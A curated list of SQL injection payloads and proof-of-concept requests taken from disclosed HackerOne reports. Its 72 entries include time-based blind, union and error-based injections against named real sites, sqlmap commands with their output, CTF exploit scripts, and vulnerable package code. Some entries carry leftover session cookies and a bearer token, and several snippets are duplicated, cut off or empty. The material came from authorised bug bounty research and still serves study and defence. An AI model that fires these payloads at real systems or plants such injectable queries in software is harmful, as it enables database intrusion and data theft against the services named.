# SQL Injection  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#865436](https://hackerone.com/reports/865436)  -  SQL Injection on the administrator panel
*critical*

```http
POST /webadmin/index.php HTTP/1.1
Host: mtngbissau.com
Referer: https://mtngbissau.com/webadmin/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Cookie: PHPSESSID=74db1535be320f591b6106253ad77191; SERVERID68971=262072|Xq8Kv|Xq8Ip

login=user'&pass=uesse
```

## 2. [#1069531](https://hackerone.com/reports/1069531)  -  Blind SQL Injection
*critical*

```http
POST /signin/ HTTP/1.1
Host: futexpert.mtngbissau.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Origin: https://futexpert.mtngbissau.com
Referer: https://futexpert.mtngbissau.com/signin/
Cookie: _ga=GA1.2.807090149.1609258213; _gid=GA1.2.432006610.1609466934; PHPSESSID=87pejs8h0usb0ill37hit63an5

phone_number=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2812%29%2C0%29%29XOR%27Z+%3D%3E&pin=1&submit=Continuar
```

## 3. [#374027](https://hackerone.com/reports/374027)  -  blind sql injection
*high*

```http
GET /plugin/tag/if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/ HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: https://betterscience.org:443/
Cookie: s9y_556bfeaw76g87a7643w7826384391f0=34583y4kj5ger78af32jh54g24; serendipity[url]=1; serendip…
Host: betterscience.org
```

## 4. [#374027](https://hackerone.com/reports/374027)  -  blind sql injection
*high*

```http
GET /plugin/tag/if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/ HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: https://betterscience.org:443/
Cookie: s9y_556bfeaw76g87a7643w7826384391f0=34583y4kj5ger78af32jh54g24; serendipity[url]=1; serendip…
Host: betterscience.org

'''
```

## 5. [#1224660](https://hackerone.com/reports/1224660)  -  bypass sql injection #1109311
*medium*

```http
POST /wp-login.php HTTP/2
Host: www.acronis.cz
Cookie: PHPSESSID=49kn3h0ecv1urjd70jucn2j4gh; _fbp=fb.1.1623467463578.959472854; wordpress_test_cookie=WP+Cookie+check
Referer: https://www.acronis.cz/wp-login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 717
Origin: https://www.acronis.cz
```

## 6. [#838855](https://hackerone.com/reports/838855)  -  [www.zomato.com] Blind SQL Injection in /php/geto2banner
*critical, $2,000*

```http
POST /php/geto2banner HTTP/1.1
Host: www.zomato.com
Content-Length: 73
Content-type: application/x-www-form-urlencoded

res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
```

## 7. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```javascript
// this query assumes the /album first fetches the album id using hash
// and then plugs that album id into a query to fetch any relevant photos
// ie, the photo query's where statement becomes `album_id = 3' union select all 1, 2, 'waffle --
// this in turn will give us another row fetched where the photo url will include waffle
sql = `' union all select "3' union all select 1, 2, 'waffle -- ' -- ", 3, 'test' -- `;
encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```

## 8. [#761304](https://hackerone.com/reports/761304)  -  SQL Injection on cookie parameter
*high*

```http
GET /index.php/search/default?t=1&x=0&y=0 HTTP/1.1
Host: mtn.com.ye
Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en'; _ga=GA1.3.1859249834.1576704214; _gid=…
```

## 9. [#1436751](https://hackerone.com/reports/1436751)  -  SQL injection in https://demor.adr.acronis.com/ via the username parameter
*high*

```http
POST /ng/api/auth/login HTTP/2
Host: demor.adr.acronis.com
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Referer: https://demor.adr.acronis.com/
Cookie: PHPSESSID=bsrq24l7g5fmth5b683v2b3gu4
Content-Length: 148

{"username":"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z","id":"27","password":"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956"}
```

## 10. [#198292](https://hackerone.com/reports/198292)  -  Time-based Blind SQLi on news.starbucks.com
*high*

```http
POST / HTTP/1.1
Host: news.starbucks.com
Content-Length: 81
Origin: https://news.starbucks.com
Content-Type: application/x-www-form-urlencoded

ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1
```

## 11. [#876800](https://hackerone.com/reports/876800)  -  Time-base SQL Injection in Search Users
*medium*

```http
POST /concrete5/index.php/ccm/system/dialogs/user/advanced_search/submit?ccm_token=1589765824:07f645727d279188e2ce2c91835ab0dd HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 399

field%5B%5D=keywords&keywords=admin&field%5B%5D=is_active&active=0&u.uName=1&u.uEmail=1&u.uDateAdded=1&uStatus=1&u.uNumLogins=1&column%5B%5D=u.uName&column%5B%5D=u.uEmail&column%5B%5D=u.uDateAdded&column%5B%5D=uStatus&column%5B%5D=u.uNumLogins&fSearchDefaultSort=u.uDateAdded&fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(20)))a)&fSearchItemsPerPage=10&__ccm_consider_request_as_xhr=1
```

## 12. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```javascript
sql = `' union all select "3' union all select 1, 2, '../api/user?id=1' -- ", 3, 'test' -- `;
encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```

## 13. [#1506129](https://hackerone.com/reports/1506129)  -  SQL Injection in version 1.4.3 and below
*high*

```http
POST /ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype&op=mod&mimetypeid=1 HTTP/1.1
Host: 192.168.56.117
Content-Type: multipart/form-data; boundary=---------------------------40629177308912268471540748701
Content-Length: 1011
Origin: http://192.168.56.117
Referer: http://192.168.56.117/ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype&op=mod&mimetypeid=1
Cookie: tbl_SystemMimetype_sortsel=mimetypeid; tbl_limitsel=15; tbl_SystemMimetype_filtersel=default…

-----------------------------40629177308912268471540748701
```

## 14. [#3198980](https://hackerone.com/reports/3198980)  -  Woocommerce SQL Injection in WC_Report_Coupon_Usage
*medium*

```http
GET /wp-admin/admin.php?page=wc-reports&tab=orders&report=coupon_usage&coupon_codes=')+union+select+1,sleep(10)--+- HTTP/1.1
Host: <host>
Cookie:<cookie of logged in session>
```

## 15. [#3198980](https://hackerone.com/reports/3198980)  -  Woocommerce SQL Injection in WC_Report_Coupon_Usage
*medium*

```http
GET /wp-admin/admin.php?page=wc-reports&tab=orders&report=coupon_usage&coupon_codes=')+union+select+1,sleep(10)--+- HTTP/1.1
Host: <host>
Cookie:<cookie of logged in session>

'''
```

## 16. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```javascript
fetch(`https://hackyholidays.h1ctf.com/people-rater/entry?id=${o}`).then(d => d.text()).then(d => console.log(d));
```

## 17. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```javascript
sql = `' union all select "3' union all select 1, 2, '../api/user' -- ", 3, 'test' -- `;
encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```

## 18. [#923020](https://hackerone.com/reports/923020)  -  SQL injection on admin.acronis.host development web service
*high, $250*

```http
GET /api/admin/pages?page=1&limit=100&sort=%2Btype&filter=%7B%7D&search=* HTTP/1.1
Host: dev.acronis.host
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZXYuYWNyb25pcy5ob3N0XC9hcGlcL2F1dGhcL2xvZ2luIiwiaWF0IjoxNTk0Njk1MzgzLCJleHAiOjE1OTQ3MzEzODMsIm5iZiI6MTU5NDY5NTM4MywianRpIjoiSnBkczlKY0x6VHF5QXphOCIsInN1YiI6MSwicHJ2IjoiODdlMGFmMWVmOWZkMTU4MTJmZGVjOTcxNTNhMTRlMGIwNDc1NDZhYSJ9._K-nn1elXhqx1RNszBeZFwX1dbyCVtv63m_-DGp7UmE
Origin: https://admin.acronis.host
Referer: https://admin.acronis.host/dev.acronis.host/en-US/products/4372
```

## 19. [#198292](https://hackerone.com/reports/198292)  -  Time-based Blind SQLi on news.starbucks.com
*high*

```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m4.945s
user	0m0.000s
sys		0m0.063s
```

## 20. [#198292](https://hackerone.com/reports/198292)  -  Time-based Blind SQLi on news.starbucks.com
*high*

```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m0.860s
user	0m0.000s
sys		0m0.031s
```

## 21. [#198292](https://hackerone.com/reports/198292)  -  Time-based Blind SQLi on news.starbucks.com
*high*

```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m4.945s

time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m1.005s
```

## 22. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```html
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center">New Campaign</h1>
    <div class="row">
        <div class="col-md-6 col-md-offset-3">
                       <form method="post">
            <div class="panel panel-default" style="margin-top:50px">
                <div class="panel-heading">New Campaign</div>
                <div class="panel-body">
                    <div><label>Name:</label></div>
                    <div><input class="form-control" name="name" value=""></div>
                    <div style="margin-top:7px"><label>Subject:</label></div>
                    <div><input class="form-control" name="subject"></div>
                    <div style="margin-top:7px"><label>Markup:</label></div>
                    <div><textarea name="markup" class="form-control" rows="15">Hello {{name}} ....</textarea></div>
                </div>
            </div>
            <div>
                <input type="button" class="btn btn-primary preview-campaign" value="Preview">
                <input type="submit" class="btn btn-success pull-right" value="Create">
            </div>
            </form>
        </div>
    </div>
</div>
<form method="post" action="/hate-mail-generator/new/preview" id="previewfrm" target="_blank">
    <input type="hidden" name="preview_markup">
    <input type="hidden" name="preview_data" value='{"name":"Alice","email":"alice@test.com"}'>
</form>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<script>
    $('.preview-campaign').click( function(){
        $('input[name="preview_markup"]').val( $('textarea[name="markup"]').val(  ) )
        $('form#previewfrm').submit();
# … truncated …
```

## 23. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```bash
curl https://hackyholidays.h1ctf.com/hate-mail-generator/templates/
<html>
<head><title>Index of /hate-mail-generator/templates/</title></head>
<body bgcolor="white">
<h1>Index of /hate-mail-generator/templates/</h1><hr><pre><a href="../">../</a>
<a href="cbdj3_grinch_header.html">cbdj3_grinch_header.html</a>                                     20-Apr-2020 10:00                   -
<a href="cbdj3_grinch_footer.html">cbdj3_grinch_footer.html</a>                                     20-Apr-2020 10:00                   -
<a href="38dhs_admins_only_header.html">38dhs_admins_only_header.html</a>                                21-Apr-2020 15:29                  46
</pre><hr></body>
</html>
```

## 24. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```html
<script>
    $('.preview-campaign').click( function(){
        $('input[name="preview_markup"]').val( $('textarea[name="markup"]').val(  ) )
        $('form#previewfrm').submit();
    });
</script>
```

## 25. [#507222](https://hackerone.com/reports/507222)  -  [untitled-model] sql injection
*high*

```js
var model = require('untitled-model');
model.connection(
	{   
		host: "localhost",
		user: "root",
		password: "",
		database:"test"
	}
);
var User = model.get('user');
//User.all((err,data)=>{
//	console.log(err,data);
//})

(async () => {
	await new Promise((resolve,reject)=>{
		User.filter({'id': 1},function(err,data){
			if(err) throw err;
			console.log('normal query', data);
			resolve();
		});
	});
	await new Promise((resolve,reject)=>{
		User.filter({'id': "' or id=2#"},function(err,data){
			if(err) throw err;
			console.log('sqli query', data);
			resolve();
		});
	});
	process.exit(0);
})()
```

## 26. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```javascript
sql = `' union all select "3", 3, 'test' -- `;
encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```

## 27. [#1067037](https://hackerone.com/reports/1067037)  -  Taking Grinch Down To Save Holidays
*critical*

```http
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
```

## 28. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```javascript
const previewData = '{"name":"Alice","email":"alice@test.com","winner":"{{template:38dhs_admins_only_header.html}}"}';
const previewMarkup = '{{winner}}';

const formData = new FormData();
formData.append('preview_markup', previewMarkup);
formData.append('preview_data', previewData);
const body = new URLSearchParams(formData);

fetch('https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview', { method: 'POST', body: new URLSearchParams(formData), headers: { 'content-type':'application/x-www-form-urlencoded'} }).then(d => d.text()).then(d => console.log(d));
```

## 29. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```javascript
let e = btoa('{"image":"r3c0n_server_4fdk59\/api\/user","auth":"e934f4407a9df9fd272cdb9c397f673f"}');
fetch(`/r3c0n_server_4fdk59/picture?data=${e}`).then(d => d.text()).then(d => console.log(d));
```

## 30. [#506654](https://hackerone.com/reports/506654)  -  [typeorm] SQL Injection
*high*

```ts
import "reflect-metadata";
import {createConnection} from "typeorm";
import {User} from "./entity/User";

createConnection().then(async connection => {

    console.log("Inserting a new user into the database...");

    for(var i=0;i<10;i++) {
        const user = new User();
        user.firstName = `Timber ${i}`;
        user.lastName = "Saw";
        user.age = 25 + i;
        await connection.manager.save(user);
        console.log("Saved a new user with id: " + user.id);
    }

    const repo = connection.getRepository(User);

    console.log(await repo.createQueryBuilder().where('firstName = :name', {name: () => "-1 or firstName=0x54696d6265722033"}).getOne());

    process.exit(0);
}).catch(error => console.log(error));
```

## 31. [#925007](https://hackerone.com/reports/925007)  -  blind sql on [selfcare.mtn.com.af]
*medium*

```http
get cid = sql 

SQL query - SELECT user FROM dual
```

## 32. [#2051931](https://hackerone.com/reports/2051931)  -  Blind SQL injection on id.indrive.com
*critical, $4,134*

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: id.indrive.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Origin: https://promo.indrive.com' -H $'Referer: https://promo.indrive.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' -H $'Connection: close' \
    $'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--'
```

## 33. [#435066](https://hackerone.com/reports/435066)  -  SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter
*critical*

```bash
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

## 34. [#435066](https://hackerone.com/reports/435066)  -  SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter
*critical*

```bash
curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

## 35. [#435066](https://hackerone.com/reports/435066)  -  SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter
*critical*

```bash
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(5\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 0% cpu 5.726 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(1\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 2% cpu 1.631 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(10\)%3B--%27
{}curl -X POST   0.02s user 0.01s system 0% cpu 10.557 total
```

## 36. [#1081145](https://hackerone.com/reports/1081145)  -  SQL Injection through /include/findusers.php
*critical*

```bash
$ php sqli.php http://localhost/impresscms/
[-] Retrieving security token...
[-] Starting SQL Injection attack...
[-] Admin's email: admin@test.com
```

## 37. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```bash
curl https://hackyholidays.h1ctf.com/hate-mail-generator/templates/38dhs_admins_only_header.html
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.15.8</center>
</body>
</html>
```

## 38. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```bash
sqlmap -r ../quiz.req --second-url=https://hackyholidays.h1ctf.com/evil-quiz/score --level=5 --risk=3 --not-string=" 0 other" -p name --dbs --tables --thread=4
```

## 39. [#844428](https://hackerone.com/reports/844428)  -  [www.zomato.com] Abusing LocalParams (city) to Inject SOLR query
*low, $100*

```http
GET /webapi/searchapi.php?city=51\ HTTP/1.1
Host: www.zomato.com
```

## 40. [#844428](https://hackerone.com/reports/844428)  -  [www.zomato.com] Abusing LocalParams (city) to Inject SOLR query
*low, $100*

```http
GET /webapi/searchapi.php?city=51\\ HTTP/1.1
Host: www.zomato.com
```

## 41. [#397445](https://hackerone.com/reports/397445)  -  [express-cart] Customer and admin email enumeration through MongoDB injection
*high*

```bash
$ python exploit.py 
alan.k@example.com
alice.r@hotmail.com
ben76543@gmail.com
bob@test.com
```

## 42. [#311244](https://hackerone.com/reports/311244)  -  [query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database
*critical*

```
' OR 1=1-- ''' - we get this:
```

## 43. [#311244](https://hackerone.com/reports/311244)  -  [query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database
*critical*

```
' OR 1=1--
```

## 44. [#311244](https://hackerone.com/reports/311244)  -  [query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database
*critical*

```
' or 1=1-- ', 'username', (msg, res) => {
```

## 45. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```html
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
```

## 46. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```html
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
```

## 47. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```
' or 1=1 -- `):
```

## 48. [#865436](https://hackerone.com/reports/865436)  -  SQL Injection on the administrator panel
*critical*

```json
[*] starting @ 21:06:44 /2020-05-03/

[18:05:44] [INFO] parsing HTTP request from 'post'
[18:06:10] [INFO] resuming back-end DBMS 'mysql' 
[18:06:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: login (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: login=admin' AND (SELECT 5206 FROM (SELECT(SLEEP(5)))THtF) AND 'MHhg'='MHhg&pass=admin
---
[18:06:45] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[18:06:45] [INFO] fetched data logged to text files under '/home/kira/.sqlmap/output/mtngbissau.com'
```

## 49. [#311244](https://hackerone.com/reports/311244)  -  [query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database
*critical*

```sql
SELECT * FROM users WHERE id='1' OR 1=1--
```

## 50. [#311244](https://hackerone.com/reports/311244)  -  [query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database
*critical*

```javascript
// app.js
//... cut for readibility
query.base.fetchById('users', 'noob\' or 1=1-- ', 'username', (msg, res) => {
  console.log(msg, res)
})
```

## 51. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```bash
sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dbs
[...]
[14:52:35] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] recon
```

## 52. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```json
{F1138543}

...
Same thing for `127.0.0.1`, `hackyholidays.h1ctf.com`, and so on. So there's some kind of protection for local targets in place... Hmm.

Running another domain, I noticed there was a slight delay between
```

## 53. [#269279](https://hackerone.com/reports/269279)  -  SQL injection in partner id field on https://www.teavana.com (Sign-up form)
*medium*

```
' OR 1=1" (without double qoutes) (3.PNG)
```

## 54. [#3395221](https://hackerone.com/reports/3395221)  -  Error-Based & Time-Based SQL Injection in 'keyword' Parameter of admin-search.php Allowing Full Database Access in Revive Adserver v6.0.0
*high*

```bash
Payload: keyword=FUZZ') AND EXTRACTVALUE(8429,CONCAT(0x5c,0x716a7a6a71,(SELECT (ELT(8429=8429,1))),0x7178787871))-- Nqvq&compact=t
```

## 55. [#3395221](https://hackerone.com/reports/3395221)  -  Error-Based & Time-Based SQL Injection in 'keyword' Parameter of admin-search.php Allowing Full Database Access in Revive Adserver v6.0.0
*high*

```bash
Payload: keyword=FUZZ') AND (SELECT 3790 FROM (SELECT(SLEEP(5)))yGYJ)-- YFDA&compact=t
```

## 56. [#374027](https://hackerone.com/reports/374027)  -  blind sql injection
*high*

```
if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/ => 3.276 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.28 s
if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/ => 9.298 s
if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/ => 6.272 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.265 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.25 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.265 s
if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/ => 6.256 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.437 s
```

## 57. [#507222](https://hackerone.com/reports/507222)  -  [untitled-model] sql injection
*high*

```mysql
CREATE TABLE `user` (
  `id` int(11) NOT NULL,
  `firstName` varchar(255) NOT NULL,
  `lastName` varchar(255) NOT NULL,
  `age` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
INSERT INTO `user` (`id`, `firstName`, `lastName`, `age`) VALUES
(1, 'Timber', 'Saw', 25),
(2, 'Timber 0', 'Saw', 25);
```

## 58. [#1067037](https://hackerone.com/reports/1067037)  -  Taking Grinch Down To Save Holidays
*critical*

```
../../tools/payloads/wordlists/wordlistsl/rockyou.txt
```

## 59. [#1067037](https://hackerone.com/reports/1067037)  -  Taking Grinch Down To Save Holidays
*critical*

```json
{{template:38dhs_admins_only_header.html}}
```

## 60. [#1067037](https://hackerone.com/reports/1067037)  -  Taking Grinch Down To Save Holidays
*critical*

```json
{{template:cbdj3_grinch_header.html}}
```

## 61. [#1067037](https://hackerone.com/reports/1067037)  -  Taking Grinch Down To Save Holidays
*critical*

```json
{{name}}
```

## 62. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```json
{{template:}}
```

## 63. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```
${btoa(`{"target":"${load}
```

## 64. [#310280](https://hackerone.com/reports/310280)  -  [Informational] Possible SQL Injection in inc/ajax-actions-frontend.php
*medium*

```
$mlm_query = "SELECT ". $distance_query ." l.id as lid,l.name as lname,... FROM `" . $table_name_layers . "` as l INNER JOIN `" . $table_name_markers . "` AS m ON m.layer LIKE concat('%\"',l.id,'\"%') ". $search_query ." WHERE l.id='" . $multi_layer_map_list . "'  ORDER BY ...";
```

## 65. [#310280](https://hackerone.com/reports/310280)  -  [Informational] Possible SQL Injection in inc/ajax-actions-frontend.php
*medium*

```
$first_mlm_id = $multi_layer_map_list_exploded[0];
$other_mlm_ids = array_slice($multi_layer_map_list_exploded,1);
$mlm_query = "(SELECT ... WHERE l.id='" . $first_mlm_id . "'  )";
foreach ($other_mlm_ids as $row) {
    $mlm_query .= " UNION (SELECT ... FROM `" . $table_name_layers . "` ... WHERE l.id='" . $row . "' )";
}
```

## 66. [#311244](https://hackerone.com/reports/311244)  -  [query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database
*critical*

```javascript
// node_modules/query-mysql/lib/base.js, line 172
    fetchById: function (table, id, name_id, callback) {
        connect(function (connected) {
            if (connected) {

                connection.query("SELECT * FROM " + table + " WHERE " +name_id+"='"+ id+"'", function (err, rows, fields) {
                    connection.end();
                    console.log("fetchById");
                    //if (err) throw err;
                    if (err) {
                        callback("error", null);
                    }else{						
                        callback("success", rows);
                    };
                })

            }else{
                callback("error_connection", null);
            };
        })
    },
```

## 67. [#1067037](https://hackerone.com/reports/1067037)  -  Taking Grinch Down To Save Holidays
*critical*

```
$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
```

## 68. [#1067037](https://hackerone.com/reports/1067037)  -  Taking Grinch Down To Save Holidays
*critical*

```
preview_markup=hIII{{template:cbdj3_grinch_header.html}} &preview_data={"name":"Alice","email":"alice@test.com"}
```

## 69. [#1067037](https://hackerone.com/reports/1067037)  -  Taking Grinch Down To Save Holidays
*critical*

```
preview_markup={{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}
```

## 70. [#1067037](https://hackerone.com/reports/1067037)  -  Taking Grinch Down To Save Holidays
*critical*

```
1. /api/
Req-a
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=6860'+UNION+ALL+SELECT+"12'+UNION+ALL+SELECT+1,1,\"../api/\"--+-",NULL,"test'"--+-
Req-b
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9

Response : Invalid content type detected

2. /api/test/
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=3230'+UNION+ALL+SELECT+"12'+UNION+ALL+SELECT+1,1,\"../api/test\"--+-",NULL,"test'"--+-

Req-b
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3Rlc3QiLCJhdXRoIjoiOWQ0M2MwMDQ4MjMzNWFiYzhjZmRmNjM3YzAwNWJkZDYifQ==

Response: Expected HTTP status 200, Received: 404
```

## 71. [#1067037](https://hackerone.com/reports/1067037)  -  Taking Grinch Down To Save Holidays
*critical*

```
payloads=open('apiwordlist.txt',"r")
sql1='''33230'+UNION+ALL+SELECT+"12'+UNION+ALL+SELECT+1,1,\"../api/'''
sql2='''\"--+-",NULL,"test'"--+-'''
url='https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=+sql1+payloads+sql2'

t1=requests.get(url).text
searchdata=re.search("data=(.*cL3VwbG9hZHNcLy.*)\"", t1).group(1)
t2=requests.get("http://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=+searchdata")

if "Received: 404" not in t2.text:
    print(t2.text, payloads)
```

## 72. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```javascript
